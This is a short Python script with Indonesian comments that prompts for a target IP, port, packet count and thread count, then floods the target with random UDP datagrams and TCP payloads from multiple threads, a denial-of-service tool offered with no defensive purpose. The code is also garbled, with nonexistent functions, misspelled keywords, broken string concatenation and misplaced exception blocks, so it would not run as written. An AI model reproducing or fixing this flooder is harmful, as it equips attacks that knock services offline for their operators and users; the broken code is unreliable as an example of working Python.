#Age 17-01-2022 Time 12:32 
#Semoga sakit tools nya ya banh
#Hasil Gabut
#Codes by Rull
import random
import socket 
import threading

ip = str(input(" IP:"))
port = int(input(" PORT:"))
times = int(input(" PACKETS:"))
threads = int(input(" THREADS:"))
def run():
  data = random._unrandom(1025)
  xx = int(0)
  while True:
    try:
      s = socket.socket(socket.AF_INET       , socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
       for x in range(times):
           s.sendto(data,addr)
           print(' Sedang Menyenggol '+ip+)
           except:
             print(' Berhasil Menyenggol '+ip+)

def.run2():
  data = random._unrandom(16)
  i = random.choice(("[]","[!]","[#]"))
  while.ture:
    try:
      s = socket.socket(socket.AF_INET        , socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send((data))
      print(' Sedang Menyenggol '+ip+)
      except:
        s.close()
        print(' Berhasil menyenggol '+ip+)
  
  for x in range(threads):
    if.choice == 'x':
      th == threading.Threads(target run2)
      th.start():
        else:
         th = threading.Threads(target run2)
         th.start()

